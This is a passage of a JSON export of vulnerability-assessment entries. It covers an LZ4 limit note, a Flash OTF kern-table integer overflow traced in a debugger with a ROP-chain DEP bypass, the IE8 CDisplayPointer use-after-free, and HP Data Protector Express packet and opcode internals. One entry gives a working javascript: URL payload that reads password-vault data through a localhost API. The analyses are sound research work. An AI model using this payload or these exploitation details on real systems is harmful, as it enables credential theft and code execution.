4KB\n  \t* Linux kernel = 8MB (uses LZ4 legacy)\n  \t* Antivirus unpacking uses the official documented LZ4 (4MB max, 8MB if legacy format)\n  \t* The latest lzo.c in FFmpeg is set at (10*1024*1024) + 16 (that's 10MB + 16 bytes), and is allocated\n  \t  on the heap. However, matroskadec.c uses av_lzo1x_decode() with its own implementation and as\n  \t  far as I can tell there is no hard size limit.\n* The attack is most likely local\n\nFrom the attacker's perspective, it's difficult to find apps out there that are actually vulnerable,\nbecause so far we have not found one that exceeds 10MB, and we need something like 16MB. It's even\nmore difficult to find them exploitable because of other memory corruption mitigations supported by\nmodern operating systems.\n\n\nThe fix in LZ4 can be found here (there is also a testing tool in fuzz.c):\nhttps://github.com/Cyan4973/lz4/commit/da5373197e84ee49d75b8334d4510689731d6e90\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "d6e11fdf-acde-4b8e-8d73-ab520e4fb7dc",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "1d018435-a9c7-4316-b5a2-3d807278b1d4",
      "created": "2019-09-12T18:07:44.699668Z",
      "revisionDate": "2020-02-13T17:12:11.433448Z",
      "document": "\n\nThis example will show the domain of the first encrypted password:\n\n```\nhttps://localhost:49155/api/showSB?url=javascript:topWindow.process.mainModule.exports.Tower.handle.getUserData(function(n){alert(JSON.parse(n).data.passcard[0].Domain)})'\n```\n",
      "score": 0,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e8e94498-2132-4e79-892b-baa03ed1e8c9",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "ea2fe8e1-d679-484f-84c3-70e4eb42e291",
      "created": "2019-09-12T18:07:45.415069Z",
      "revisionDate": "2020-10-21T20:10:42.837346Z",
      "document": " HERE\n```\n\nThe first offset (0x7800) doesn't seem to point to anything meanful in 010 editor. But the second\none (0x8340) falls into the \"kern\" table section:\n\n```\n\tstruct tTable Table[8]\tkern (1801810542) at 33604 for 15852\t8Ch\t10h\tFg:\n\tunion Tag\t\t8Ch\t4h\tFg:\n\tULONG checkSum\tA466AE58h\t90h\t4h\tFg:\n\tULONG offset\t8344h\t94h\t4h\tFg:\n\tULONG length\t3DECh\t98h\t4h\tFg:\n```\n\nThe 010 TFF template can't seem to parse the kern table properly. But we can do it manually.\nAccording to the TFF specs found at developer.apple.com:\n\n\thttps://developer.apple.com/fonts/TTRefMan/RM06/Chap6kern.html\n\n```\n\tTable 25: 'kern' header\n\tType\tName\tDescription\n\tfixed32\tversion\tThe version number of the kerning table (0x00010000 for the current version).\n\tuint32\tnTables\tThe number of subtables included in the kerning table.\n```\n\nSo let's look at line 0x00008340 again:\n\n```\n\t$ cat PSPop.otf |hexdump -C |grep 00008340\n\t00008340  00 00 00 00 00 01 00 00  10 00 00 00 1e 0c ff e8  |................|\n\t                         ^Version  ^ nTables\n```\n\nOur DEP-bypass strategy is by remotely detecting the Flash version (which can be fingerprinted by\nchecking the 'x-flash-version' header), and then return the payload -- including the ROP chain\nspecific to that Flash version.  If we don't have a suitable ROP chain for a Flash version, we\nreturn a JRE ROP chain instead.  One possible drawback while using the Flash ROP is that the Flash\nocx can rebase. For example: if the victim machine has Adobe PDF installed, it is possible\nAcroIEHelperShim.dll can push the Flash ActiveX component out of 0x10000000, and then cause the\nexploit to fail. Other components could also do the same.\n\n\n\nNote: Integer overflow probably needs to be explained better\n\n# The Integer Overflow\n\nFlash Version used to document the Integer Overflow: 11.3.300.268\n\n* 10h bytes are reserved to store the Kern Header Info:\n\n```\n.text:104418A3                 mov     eax, [ebp+Allocator]\n.text:104418A6                 push    10h             ; Size to allocate\n.text:104418A8                 push    eax\n.text:104418A9                 call    dword ptr [eax] ; Allocate memory for the Kern Header Info\n.text:104418AB                 mov     esi, eax\n.text:104418AD                 pop     ecx\n.text:104418AE                 pop     ecx\n.text:104418AF                 mov     [ebp+Kern_Header_1_var_C], esi\n```\n\n* The Kern Header is filled with the next data:\n\n```\n[esi] => Allocator\n[esi + 4] => Stream\n[esi + 8] => nTables\n[esi + C] => pointer to SubTables\n```\n\n```\n.text:104418C0                 mov     eax, [ebp+stream]\n.text:104418C3                 mov     ecx, [ebp+Allocator]\n.text:104418C6                 mov     [esi+8], eax    ; nTables\n.text:104418C9                 shl     eax, 4          ; \u00a1\u00a1\u00a1Integer Overflow!!!!\n.text:104418CC                 push    eax             ; Size to allocate for nTables\n.text:104418CD                 push    ecx\n.text:104418CE                 mov     [esi], ecx      ; allocator\n.text:104418D0                 mov     [esi+4], edi    ; stream\n```\n\nThe nTables value suffers from an Integer Overflow on 104418C9 and the calculation is used to reserve memory\nto store the nTables. Basically it's trying to get 0x10 bytes by every nTable:\n\n```\n.text:104418D3                 call    dword ptr [ecx] ; Allocate Memory for nTables\n```\n\nAnd the pointer to the reserved Memory is stored in [esi+0ch]:\n\n```\n.text:104418D5                 pop     ecx\n.text:104418D6                 pop     ecx\n.text:104418D7                 xor     ecx, ecx\n.text:104418D9                 mov     [esi+0Ch], eax  ; Memory Allocated for the nTables, after the Integer Overflow...\n```\n\nHow is memory allocated when there is an Integer Overlow? Just a Sample:\n\n* kern Table Header\n\n```\nBreakpoint 0 hit\neax=025fc1b0 ebx=00000008 ecx=00000000 edx=00003dec esi=00000000 edi=025f8250\neip=104418a9 esp=0013dadc ebp=0013db08 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00040206\nFlash32_11_3_300_268!DllUnregisterServer+0x285e47:\n104418a9 ff10            call    dword ptr [eax]      ds:0023:025fc1b0=8d440310\n0:000> p\neax=025fd760 ebx=00000008 ecx=1088c214 edx=00000000 esi=00000000 edi=025f8250\neip=104418ab esp=0013dadc ebp=0013db08 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00040246\nFlash32_11_3_300_268!DllUnregisterServer+0x285e49:\n104418ab 8bf0            mov     esi,eax\n```\n\nSo Memory for the Kern Table Header is allocated at: 025fd760\n\n* nTables:\n\n```\neax=00000000 ebx=00000008 ecx=025fc1b0 edx=00000000 esi=025fd760 edi=025f8250\neip=104418d3 esp=0013dadc ebp=0013db08 iopl=0         nv up ei pl zr na pe cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00040247\nFlash32_11_3_300_268!DllUnregisterServer+0x285e71:\n104418d3 ff11            call    dword ptr [ecx]      ds:0023:025fc1b0=8d440310\n0:000> p\neax=025f9038 ebx=00000008 ecx=1088c1cc edx=00000000 esi=025fd760 edi=025f8250\neip=104418d5 esp=0013dadc ebp=0013db08 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00040246\nFlash32_11_3_300_268!DllUnregisterServer+0x285e73:\n104418d5 59              pop     ecx\n```\n\nMemory for nTables is (incorrectly) allocated at: 025f9038\n\nThe crafted OTF font file has 0x10000000 nTables, and for every nTable 0x10 bytes\nare filled, it wants to say that, after\n\n```\n025fd760 - 025f9038 => 0x4728 / 0x10h => 0x472 (ENTRIES)\n```\n\nSo after 0x472 entries, the memory for the kern Table Header should be\noverwritten. Having into account that the nTables memory is filled in a loop,\nafter 0x472 loops, the Kern Header Table will be overwritten. It is interesting\nbecause the nTables value stored in the kern Header Table (offset +8) is used\nas condition to leave the copy loop:\n\n```\n.text:104419C3                 inc     [ebp+counter_nTables_Read_var_8]\n.text:104419C6                 mov     eax, [ebp+Kern_Header_1_var_C]\n.text:104419C9                 mov     ecx, [ebp+counter_nTables_Read_var_8]\n.text:104419CC                 add     [ebp+data_nTables_copied_var_4], 10h\n.text:104419D0                 add     ebx, [ebp+var_18]\n.text:104419D3                 mov     esi, eax\n.text:104419D5                 cmp     ecx, [eax+8]    ; comparing ecx with nTables\n.text:104419D8                 jb      loc_10441906    ; copy loop\n```\n\nIn every loop 0x10 bytes are filled. In order to understand how memory is overwritten\nwe can put the next breakpoints:\n\n```\nbp 10441964 \".echo Offset 0; r esi; r eax; g\"\nbp 10441921 \".echo Offset 4; r esi; r ebx; g\"\nbp 10441973 \".echo Offset 8; r esi; r eax; g\"\nbp 104419A6 \".echo Offset C; r esi; r eax; g\"\nbp 104419D5 \".echo Counter; r ecx; g\"\n```\n\nThe file debug_flash.txt contains a debugged session to understand how nTables are filled. The\ndata is partialy controlled from the OTF font file. The pattern is the next one:\n\n```\n025fb138  00000000 1e0cfff0 1e0d0000 ffffffff\n025fb148  00000000 1e0cfff0 1e0d0000 ffffffff\n025fb158  00000000 1e0cfff0 1e0d0000 ffffffff\n                   ^^^^^^^^ ^^^^^^^^\n                    controlled data\n```\n\nWhen the Kern header is overwritten it's what happens when comparing the ecx counter with the\nnTables stored value:\n\n```\necx=00000474\neax + 8 => 025fd768  00000000\n```\n\nSo it goes away from the loop, with the Kern Header Table filled with the next data:\n\n```\n0:000> dd 025fd760 L4\n025fd760  1e0d0000 ffffffff 00000000 1e0cfff0\n```\n\nOnce the function returns, it is what happens:\n\n```\n.text:104354DF                 call    overflow_sub_1044184C ; it manages the kern table\n.text:104354E4                 add     esp, 0Ch              ; we're returning here\n.text:104354E7                 mov     [esi+0F8h], eax\n.text:104354ED\n.text:104354ED loc_104354ED:                           ; CODE XREF: sub_10435420+BA\u0018j\n.text:104354ED                 mov     eax, [esi+4]\n.text:104354F0                 push    'GDEF'\n.text:104354F5                 push    dword ptr [esi+8]\n.text:104354F8                 push    eax\n.text:104354F9                 push    edi\n.text:104354FA                 push    ebx\n.text:104354FB                 call    dword ptr [eax+20h] ; get control\n```\n\nOnce we return from overflow_sub_1044184C starts the parsing of the GDEF table (also related\nto OTF parsing), on 104354FB control can be achieved:\n\n```\nBreakpoint 0 hit\neax=029fb360 ebx=029fc1b0 ecx=00000472 edx=00000000 esi=02b8c020 edi=0013db80\neip=104354fb esp=0013db08 ebp=0013db30 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00040202\nFlash32_11_3_300_268!DllUnregisterServer+0x279a99:\n104354fb ff5020          call    dword ptr [eax+20h]  ds:0023:029fb380=00000d1e\n0:000> dd eax\n029fb360  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb370  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb380  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb390  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3a0  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3b0  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3c0  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3d0  1e0d0000 ffffffff 00000000 1e0cfff0\n0:000> dd eax + 20\n029fb380  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb390  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3a0  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3b0  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3c0  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3d0  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3e0  1e0d0000 ffffffff 00000000 1e0cfff0\n029fb3f0  1e0d0000 ffffffff 00000000 1e0cfff0\n```\n\nEAX comes from ESI+4:\n\n```\n0:000> dd esi\n02b8c020  029fc1b0 029fb360 00000000 00000000\n                   ^^^^^^^^\n02b8c030  00000000 00000000 00000000 00000000\n02b8c040  029fd710 029ff4d0 00000000 00020001\n02b8c050  00040003 00060005 00080007 000a0009\n02b8c060  000c000b 000e000d 0010000f 00120011\n02b8c070  00140013 00160015 00180017 001a0019\n02b8c080  001c001b 001e001d 0020001f 00220021\n02b8c090  00240023 00260025 00280027 002a0029\n```\n\nAs a sample in a use case it is what happens:\n\n* Memory allocated for kern header table: 028fd740\n* Memory allocated for subtables: 028f9038\n* ESI+4h => 028fb360\n\n```\n028F9038 => SUBTABLES\n.                                                 |\n.                                                 |\n028fb360 => Interesting pointer overwritten       | Overflow!\n.                                                 |\n.                                                 |\n028fd740 => Kern header                           \\/\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "68bd45ac-ddcc-48af-a282-99745f7f45bd",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "3c7b4cf8-80c4-45a5-9363-afaa8c364d11",
      "created": "2019-09-12T18:07:46.023783Z",
      "revisionDate": "2020-02-13T17:12:10.765401Z",
      "document": "\n\n# Information\n\n\"MS13-080 also fixes a second CVE vulnerability that has been exploited in limited attacks over the\nweb. This issue is a user-after-free vulnerability in CDisplayPointer triggered with\n\u201conpropertychange\u201d event handler. This exploit was found cached on a popular Javascript analysis\nwebsite and reported to us. The exploit code for this issue, released probably around mid-September\n, uses heap-spray to allocate a small ROP chain around address 0x14141414 and is designed to target\nonly IE8 running on Windows XP for Korean and Japanese language-based users\" - Microsoft\n\nThis issue is a use-after-free vulnerability in CDisplayPointer via the use of a \"onpropertychange\"\nevent handler. To setup the appropriate buggy conditions, we first craft the DOM tree in a specific\norder, where a CBlockElement comes after the CTextArea element. There are also other ways to acheive\nthe same results, for example: Replace CBlockElement with another CTextArea. One possible explanation\nfor that is perhaps the second element needs to hold a reference of the parent.\n\nIf we use a select() function for the CTextArea element, two important things will happen: a\nCDisplayPointer object will be created for CTextArea, and it will also trigger another event called\n\"onselect\". The \"onselect\" event will allow us to setup for the actual event handler we want to abuse\n- the \"onpropertychange\" event. Since the CBlockElement is a child of CTextArea, if we do a node swap\nof CBlockElement in \"onselect\", this will trigger \"onpropertychange\".  During \"onpropertychange\" event\nhandling, a free of the CDisplayPointer object can be forced by using an \"Unslect\" (other approaches\nalso apply), but a reference of this freed memory will still be kept by CDoc::ScrollPointerIntoView,\nspecifically after the CDoc::GetLineInfo call, because it is still trying to use that to update\nCDisplayPointer's position. When this invalid reference arrives in QIClassID, a crash finally occurs\ndue to accessing the freed memory. By controlling this freed memory, it is possible to achieve arbitrary\ncode execution under the context of the user.\n\nThe trigger of the vulnerability seems to be based on previously discovered bugs, specifically\nCVE-2012-4969 (ie_execcommand_uaf) and CVE-2013-1347 (ie_cgenericelement_uaf). This just means\nthat the browser fuzzing tool was tweaked based on these references. There is some junk code in\nthe trigger. For example, contentEditable does not have to be enabled, but this attribute this\ncommonly enabled by fuzzers because of document selection. There is also multiple junk CollectGarbage\ncalls, with Math.atan2() debugging messages around them - which is also an indicator that the exploit\nauthor was still in the process of understanding what they're for. The vulnerability seems to only\nwork on Internet Explorer 8 (tested on Win 7 and Win XP), older versions might be affected, did not\ncheck. It does not work against IE9 (tested).\n\nThe exploit actually looks more like a proof-of-concept rather than weaponized. The Math.atan2()\nfunctions are used as a way to print debugging messages in WinDBG is a strong indicator that this poc\nwas possibly incomplete. It's possible that the experimental version was leaked on the web, so\nit was rushed into deployment.\n\nThe heap grooming technique is exactly the same as the CVE-2013-3893 - it'd use the\nsetAttribute() function trigger heap allocations, creates 2000 of them, and the frees half of them.\nThis also indicates it's probably done by the same author.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "2c8e2912-5130-49dc-959b-936ac5477a9a",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "00e78136-70dd-4d9b-bffb-f47a512f8edf",
      "created": "2019-09-12T18:07:46.79222Z",
      "revisionDate": "2020-02-13T17:12:10.466461Z",
      "document": "\n\nAt this moment metasploit has available a module for CVE-2012-0124:\n\nhttp://www.metasploit.com/modules/exploit/windows/misc/hp_dataprotector_new_folder\nhttps://community.rapid7.com/community/metasploit/blog/2012/07/06/an-example-of-egghunting-to-exploit-cve-2012-0124\n\nIn fact, the vulnerability exploited is an instance of CVE-2012-0123 and\nCVE-2012-0121:\n\n* CVE-2012-0123:  http://dvlabs.tippingpoint.com/advisory/TPTI-12-06\n\nThis vulnerability allows remote attackers to execute arbitrary code on\nvulnerable installations of Hewlett-Packard Data Protector.\nAuthentication is not required to exploit this vulnerability.\n\nThe specific flaw exists within the dpwintdb.exe process which listens\nby default on TCP port 3817. When parsing data within a DtbClsAddObject\nrequest, the process copies data from the network into a fixed-length\nbuffer on the stack via an unchecked loop. This can be leveraged by\nattackers to execute arbitrary code under the context of the SYSTEM user.\n\n\n* CVE-2012-0121: http://www.zerodayinitiative.com/advisories/ZDI-12-097/\n\nThis vulnerability allows remote attackers to execute arbitrary code on\nvulnerable installations of HP Data Protector Express. Authentication is\nnot required to exploit this vulnerability. User interaction is not\nrequired to exploit this vulnerability.\n\nThe specific flaw exists within the dpwinsdr.exe process which listens\non TCP port 3817 by default. The process has insufficient bounds checking\non user-supplied data copied to a fixed-length buffer on the stack.\nRemote, unauthenticated attackers can exploit this vulnerability by\nsending malformed opcode 0x320 message packets to the target, which could\nultimately lead to arbitrary code execution under the context of the SYSTEM\nuser.\n\n\n* Why is an instance of CVE-2012-0123?\n======================================\n\nReally, the handler of the operation \"new folder\" uses DtbClsAddObject to\ncreate the new dir, where in fact, overflow happens.\n\nThe handler for the new folder operation can be found on dpwindtb.dll:\n\nint __cdecl sub_1000C750(int a1, int a2, int a3, int a4, int a5)\n{\n  int v5; // ebx@1\n  int result; // eax@1\n  int v7; // ebx@3\n  int v8; // eax@3\n  int v9; // ecx@3\n  int v10; // edx@3\n  int v11; // [sp+Ch] [bp-24h]@3\n  int v12; // [sp+10h] [bp-20h]@3\n  int v13; // [sp+14h] [bp-1Ch]@3\n  int v14; // [sp+18h] [bp-18h]@3\n  char v15; // [sp+1Ch] [bp-14h]@2\n\n  DtbClsByteOrder_ObjId(a5 + 28);\n  DtbClsByteOrder_DTBOBJECT(a5 + 48);\n  v5 = *(_DWORD *)(a5 + 44);\n  result = DtbClsCheckValidOptions(v5);\n  if ( !result )\n  {\n    result = DtbClsGetRequest(a2, a3, *(_DWORD *)(a5 + 20), *(_DWORD *)(a5 + 24), &v15);\n    if ( !result )\n    {\n      resource_lock_sub_10002414();\n      v7 = DtbClsAddObject(&v15, a5 + 28, v5 | 0x80000000, a5 + 48, &v11); // Using the vulnerable DtbClsAddObject with controlled data.\n      resource_unlock_sub_10002991();\n      DtbClsPutRequest(&v15);\n      v8 = v12;\n      v9 = v13;\n      *(_DWORD *)(a5 + 20) = v11;\n      v10 = v14;\n      *(_DWORD *)(a5 + 24) = v8;\n      *(_DWORD *)(a5 + 28) = v9;\n      *(_DWORD *)(a5 + 32) = v10;\n      SvcSetCommandLength();\n      DtbClsByteOrder_ObjId(a5 + 20);\n      result = v7;\n    }\n  }\n  return result;\n}\n\n\nThe metasploit blog can be checked for a detailed analysis of the\noverflowing loop also announced by the ZDI advisory:\n\nhttps://community.rapid7.com/community/metasploit/blog/2012/07/06/an-example-of-egghunting-to-exploit-cve-2012-0124\n\n* Why it's an instance of CVE-2012-0121?\n========================================\n\nBecause the \"new folder\" operation is one of the operations handled by\nthe dpwindtb module => Data Protector Express Microsoft Windows Database\nService (x86).\n\nAll these operations are handled by the same SVC ID => 0x32020202 (not\nonly 0x320 really). (The SVC ID is part of the packet header).\n\nBTW, the available service ids (svc ids) are:\n30000000\n32020202 => ZDI-2012-097\n33040404 => ZDI-2012-096\n34050505\n35060606\n36070707\n\nIn order to get the available services the SvcGetServiceInstance_0 function\nprovided by the dpwinsup.dll module. In this function, the a1 arg is the\nSVCID requested, and off_102A13BC + 26120 points to the valid SVC ID's\ntable:\n\nsigned int __cdecl SvcGetServiceInstance_0(int a1, int a2)\n{\n  void *v2; // esi@1\n  unsigned int v3; // eax@1\n  char *v4; // ecx@1\n\n  v2 = off_102A13BC;\n  v3 = 0;\n  v4 = (char *)off_102A13BC + 26120;\n  while ( *(_DWORD *)v4 != a1 )\n  {\n    ++v3;\n    v4 += 4;\n    if ( v3 >= 0x40 )\n      return 59;\n  }\n  *(_DWORD *)a2 = *((_DWORD *)off_102A13BC + 2 * v3 + 6594);\n  *(_DWORD *)(a2 + 4) = *((_DWORD *)v2 + 2 * v3 + 6595);\n  return 0;\n}\n\nSo at runtime with the help of debugging:\n\n102e8c88  30000000 32020202 33040404 35060606\n102e8c98  34050505 36070707 00000000 00000000\n\n* Aren't there other 0x320 requests which could be vulnerable:\n==============================================================\n\nAbsolutly YES! There could be others, but I've not been able to find them\natm.\n\nIn order to understand which subtypes of \"0x320\" requests exists, one must\nhave into account how connections are managed by HP Data Protector\nExpress.\n\nConnections are managed by the dpwinsup.dll module, specifically by the\nfunction sub_10191140, A connection needs to send a hello packet, once\ndone, different job requests and ping requests can be launch from the\nsame connection (handled by the infinite loop):\n\nint __cdecl sub_10191140(int a1, int a2)\n{\n  int v2; // esi@1\n  int v3; // edi@1\n  int v4; // eax@3\n  int v5; // ebx@3\n  int v6; // eax@4\n  int v7; // eax@6\n  int v8; // eax@20\n  __int16 v10; // [sp+10h] [bp-14h]@6\n\n  v2 = *(_DWORD *)(a2 + 8);\n  v3 = *(_DWORD *)(a2 + 12);\n  if ( SvcGetPointerEx(0, 0, (void *)0x40001, *(_DWORD *)(a2 + 8), *(void **)(a2 + 12), (int)&a2)\n    || (Msg(6, \"Ses: %s connection service for %h is now running\", (unsigned int)\"Server\"), handle_hello_sub_1000D198(a2)) )\n  {\nLABEL_18:\n    v4 = a2;\n    goto LABEL_19;\n  }\n  v4 = a2;\n  v5 = *((_DWORD *)off_102A13BC + 6744);\n  if ( *(_DWORD *)(a2 + 2486) != 1 )\n  {\nLABEL_19:\n    *(_DWORD *)(v4 + 2482) |= 8u;\n    sub_10007D97(a2, 2);\n    goto LABEL_20;\n  }\n  while ( 1 )\n  {\n    v6 = SvcWaitForRecv(v4 + 40, v5);\n    if ( v6 )\n    {\n      if ( v6 != 47 )\n      {\n        if ( v6 == 52 )\n          Msg(6, \"Ses: Socket timeout error on %s connection %h, connection dropped (%e)\", (unsigned int)\"server\");\n        else\n          Msg(6, \"Ses: Socket error waiting on %s connection %h, connection dropped (%e)\", (unsigned int)\"server\");\n      }\n      goto LABEL_18;\n    }\n    v4 = a2;\n    if ( *(_DWORD *)(a2 + 2486) != 1 )\n      goto LABEL_19;\n    v7 = SvcRecv(a2 + 40, 20, &v10);\n    if ( v7 )\n    {\n      if ( v7 != 47 )\n        Msg(6, \"Ses: Socket error receiving header on connection %h, connection dropped (%e)\", v2);\n      goto LABEL_18;\n    }\n    if ( v10 == 0x8451 )\n    {\n      j_requests_84_51_sub_10190F60(a2, &v10);\n      goto LABEL_11;\n    }\n    if ( v10 != 0x8455 )\n      break;\n    ping_request_sub_1000BEBA(a2);\nLABEL_11:\n    v4 = a2;\n    if ( *(_DWORD *)(a2 + 2486) != 1 )\n      goto LABEL_19;\n  }\n  if ( v10 != 33878 )\n    goto LABEL_18;\n  sub_1000BBBD(a2);\nLABEL_20:\n  Msg(6, \"Ses: %s connection service for %h is now stopped\", (unsigned int)\"Server\");\n  v8 = a2;\n  if ( *(_DWORD *)(a2 + 2486) != 2 )\n  {\n    SvcReleaseSocket(a2 + 40);\n    v8 = a2;\n  }\n  *(_DWORD *)(v8 + 2486) = 0;\n  SvcPutPointerEx(0, 0, (void *)0x40001, *(_DWORD *)a2, *(void **)(a2 + 4), (int)&a2);\n  sub_10006479(v2, v3);\n  return 0;\n}\n\nThe packets headers are of 0x14 bytes with the next layout:\n\n4 bytes => Packet ID\n\t0x8454 => Hello packets\n\t0x8451 => Job requests\n\t0x8455 => Ping requests\n4 bytes => SVC ID\n4 bytes => CMD ID\n4 bytes => Packet length\n4 bytes => ??Unknown?? 0x000000 works well to request jobs.\n\nEvery SVC (a dll really), handle its own CMD ID's. The dpwinsup.dll provides\nthe SvcCallDriver which is the responsible of dinamically dispatch the job\nto the correct module:\n\nint __cdecl SvcCallDriver_0(int a1, int a2, int a3)\n{\n  int result; // eax@1\n\n  result = SvcIsValidInstanceIocmd(a1, a2);\n  if ( !result )\n    result = (*(int (__cdecl **)(int, int, int))(a1 + 512))(a1, a2, a3);\n  return result;\n}\n\nIn order to find the CMD ID's valids for the SVC 0x32020202 (dpwindtb.dll)\nthe job handler from this module must be examined:\n\nint __cdecl sub_1001BAC0(int a1, unsigned int a2, int a3)\n{\n  int result; // eax@5\n\n  if ( a2 <= 0x1000003 )\n  {\n    if ( a2 == 0x1000003 )\n      return sub_1001BA30(a1);\n    if ( a2 == 0x1000001 )\n      return 0;\n    if ( a2 == 16777218 )\n      return sub_1001BA90(*(_DWORD *)(a3 + 8), *(_DWORD *)(a3 + 12));\n    return 3;\n  }\n  if ( a2 == 0x1040007 )\n  {\n    if ( *(_DWORD *)(SvcGetGlobalDataEx() + 7908) )\n      sub_10002252();\n    result = 0;\n  }\n  else\n  {\n    if ( a2 != 0x2000001 )\n      return 3;\n    result = SvcDispatchService();\n  }\n  return result;\n}\n\nAs seen above, it makes use of the SvcDispatchService() api, provided\nby dpwinsup.dll, which finally queries the next table of available methods\non dpwindtb.dll:\n\n.data:100A25C4                 dd offset sub_10002905  ; CMD ID 0x1\n.data:100A25C8                 dd offset sub_10001B2C  ; CMD ID 0x2\n.data:100A25CC                 dd offset sub_10001E51\n.data:100A25D0                 dd offset sub_1000163B\n.data:100A25D4                 dd offset sub_10001F6E\n.data:100A25D8                 dd offset sub_10001B9A  ; CMD ID 0x6 => AddObject (new folder, our case)\n.data:100A25DC                 dd offset sub_10002581\n.data:100A25E0                 dd offset sub_10001AD2\n.data:100A25E4                 dd offset sub_100026DF\n.data:100A25E8                 dd offset sub_100020C7\n.data:100A25EC                 dd offset sub_10001F28\n.data:100A25F0                 dd offset sub_10001235\n.data:100A25F4                 dd offset sub_10001CBC\n.data:100A25F8                 dd offset sub_1000227F\n.data:100A25FC                 dd offset sub_1000141F\n.data:100A2600                 dd offset sub_100013E3\n.data:100A2604                 dd offset sub_10002AA4\n.data:100A2608                 dd offset sub_10002937\n.data:100A260C                 dd offset sub_10001BD6\n.data:100A2610                 dd offset sub_10002A8B\n.data:100A2614                 dd offset sub_10001735\n.data:100A2618                 dd offset sub_100025EA\n.data:100A261C                 dd offset sub_1000236A\n.data:100A2620                 dd offset sub_1000291E\n.data:100A2624                 dd offset sub_10001DB6\n.data:100A2628                 dd offset sub_100012B7\n.data:100A262C                 dd offset sub_100027C0\n.data:100A2630                 dd offset sub_100020A4\n.data:100A2634                 dd offset sub_100010B4\n.data:100A2638                 dd offset sub_1000101E\n.data:100A263C                 dd offset sub_100020E0\n.data:100A2640                 dd offset sub_10001F64\n.data:100A2644                 dd offset sub_100021FD\n.data:100A2648                 dd offset sub_100018A2\n.data:100A264C                 dd offset sub_100011B8\n.data:100A2650                 dd offset sub_10002383\n.data:100A2654                 dd offset sub_1000106E\n.data:100A2658                 dd offset sub_1000233D\n.data:100A265C                 dd offset sub_1000132A\n.data:100A2660                 dd offset sub_100014E2\n.data:100A2664                 dd offset sub_1000245F\n.data:100A2668                 dd offset sub_10001F14\n.data:100A266C                 align 10h\n.data:100A2670                 dd offset sub_10001FFA\n.data:100A2674                 dd offset sub_1000164F\n.data:100A2678                 dd offset sub_1000247D\n.data:100A267C                 dd offset sub_1000244B\n.data:100A2680                 dd offset sub_10002473\n.data:100A2684                 dd offset sub_10002563\n.data:100A2688                 dd offset sub_100020B3\n.data:100A268C                 dd offset sub_10002342\n.data:100A2690                 dd offset sub_100023C9\n.data:100A2694                 dd offset sub_100028E7\n.data:100A2698                 dd offset sub_10001A69\n.data:100A269C                 dd offset sub_10001CF3\n.data:100A26A0                 dd offset sub_10002AEF\n.data:100A26A4                 dd offset sub_100014B5\n.data:100A26A8                 dd offset sub_10001DFC\n.data:100A26AC                 dd offset sub_10001AFF\n.data:100A26B0                 dd offset sub_10001F1E\n.data:100A26B4                 dd offset sub_10001348\n.data:100A26B8                 dd offset sub_10001BD1\n.data:100A26BC                 dd offset sub_100023E7\n.data:100A26C0                 dd offset sub_10001F55\n.data:100A26C4                 dd offset sub_10002A3B\n.data:100A26C8                 dd offset sub_10001BC2\n.data:100A26CC                 dd offset sub_100019C4\n.data:100A26D0                 dd offset sub_10001DC5\n.data:100A26D4                 dd offset sub_10001F46\n.data:100A26D8                 dd offset sub_1000103C\n.data:100A26DC                 dd offset sub_10002469\n.data:100A26E0                 dd offset sub_10001F05\n\n* Aren't there other calls to DtbClsAddObject ?\n===============================================\n\nAfter inspecting xrefs to DtbClsAddObject from dpwindtb.dll the only reference\neasily rechable from a job handler is the new folder case, but sure, other\nreferences should be examined carefully, no luck atm. I tried also a\ndynamic approach, debug using the original client, breakpoing the\nDtbClsAddObject... no luck atm.\n\n* Bindiffing\n============\n\n1) Bindiffing of the windtb.dll module has been conducted, there are\nmainly two differences:\n\n* The method used for the AddFolder (our exploit, maybe aaron was able\nto bypass authentication?? I've tried but no success atm)!!! grrrr BTW,\nthe login is handled by the routine sub_1002DD30 in dpwindtb.dll, which\nuses dtbclslogin (http://www.zerodayinitiative.com/advisories/ZDI-10-174/).\n* The method used for the Upgrade (cmd ID => 0x42, checks for product\nactivation, since Im working with the trial, no luck testint this case.\n\n2) Also bindiffing of the dpwinods.dll module has been conducted ( 0x330 requests service handler ): all matches\nwith similarity 1.0\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "bd430b89-c2bc-48d1-9ad2-5c8207555dc8",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "474082d9-2ab6-4825-8592-0b8a94ba1596",
      "created": "2019-09-12T18:07:48.167142Z",
      "revisionDate": "2020-02-13T17:12:10.18121Z",
